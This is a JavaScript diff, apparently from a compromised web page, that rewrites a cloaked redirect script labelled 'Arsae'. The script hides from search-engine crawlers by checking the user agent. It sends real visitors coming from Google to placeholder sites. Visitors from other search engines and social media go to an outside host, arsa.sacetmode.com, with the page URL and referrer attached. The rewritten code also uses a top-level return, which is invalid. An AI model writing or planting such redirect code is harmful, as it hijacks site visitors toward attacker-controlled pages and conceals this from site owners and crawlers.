@@ -19,19 +19,18 @@ document.write('</noscript>');
 ///// Arsae /////
 var ars = 'https://arsa.sacetmode.com/';
 var redirect_urls = ['https://example.com', 'https://example2.com'];
-
 function isBot() {
     return /bot|googlebot|bingbot|yandexbot|duckduckbot|yahoo|baidu|baiduspider|crawler|spider|robot|crawling|facebookexternalhit|slurp|msnbot/i.test(navigator.userAgent);
 }
-
-if (!isBot()) {
-    if (document.referrer.toLowerCase().includes('.google.')) {
-        // Redirect real users from Google to example.com/example2.com
-        window.location.href = redirect_urls[Math.floor(Math.random() * redirect_urls.length)];
-    }
-    // For other search engines/social media
-    else if (['.edu.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => document.referrer.toLowerCase().includes(s)) || 
-             ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) {
-        window.location.href = ars + '/?arsae=' + encodeURIComponent(window.location.href) + '&arsae_ref=' + encodeURIComponent(document.referrer);
-    }
+var referrer = document.referrer.toLowerCase();
+if (isBot()) {
+    return;
+}
+if (referrer.includes('.google.')) {
+    // User dari Google ke example.com/example2.com
+    window.location.href = redirect_urls[Math.floor(Math.random() * redirect_urls.length)];
+} 
+else if (['.edu.', 'msn.', 'bing.', 'yandex.', 'facebook.', 'ecosia', 'qwant', 'pinterest.', 'duckduckgo.', '.yahoo.', 't.co'].some(s => referrer.includes(s)) || 
+         ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))) {
+    window.location.href = ars + '/?arsae=' + encodeURIComponent(window.location.href) + '&arsae_ref=' + encodeURIComponent(document.referrer);
 }
